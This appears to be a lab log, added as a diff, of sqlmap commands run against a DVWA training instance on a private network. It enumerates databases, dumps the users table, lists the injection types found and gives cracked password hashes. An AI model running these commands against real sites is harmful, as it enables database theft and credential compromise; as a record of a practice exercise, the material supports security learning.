@@ -1,0 +1,46 @@
+# SQLMap Commands for DVWA SQL Injection Simulation
+# Date: April 27, 2026
+# Target: 192.168.1.24 (DVWA)
+# Attacker: Kali Linux (192.168.1.29)
+
+# ============================================================
+# STEP 1: List all databases
+# ============================================================
+sqlmap -u "http://192.168.1.24/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low" --dbs
+
+# Result: Found 2 databases - dvwa and information_schema
+
+
+# ============================================================
+# STEP 2: List tables in 'dvwa' database
+# ============================================================
+sqlmap -u "http://192.168.1.24/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low" -D dvwa --tables
+
+# Result: Found 2 tables - guestbook and users
+
+
+# ============================================================
+# STEP 3: Dump 'users' table (extract all data)
+# ============================================================
+sqlmap -u "http://192.168.1.24/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low" -D dvwa -T users --dump
+
+# Result: Successfully dumped user credentials to CSV file
+# Location: /root/.local/share/sqlmap/output/192.168.1.24/dump/dvwa/users.csv
+
+
+# ============================================================
+# INJECTION POINTS FOUND BY SQLMAP
+# ============================================================
+# 1. Boolean-based blind (OR condition)
+# 2. Error-based (EXTRACTVALUE)
+# 3. Time-based blind (SLEEP)
+# 4. UNION query (2 columns)
+
+
+# ============================================================
+# CRACKED PASSWORDS
+# ============================================================
+# 5f4dcc3b5aa765d61d8327deb882cf99 -> password
+# e99a18c428cb38d5f260853678922e03 -> abc123
+# 8d3533d75ae2c3966d7e0d4fcc69216b -> charley
+# 0d107d09f5bbe40cade3de5c71e9e9b7 -> letmein
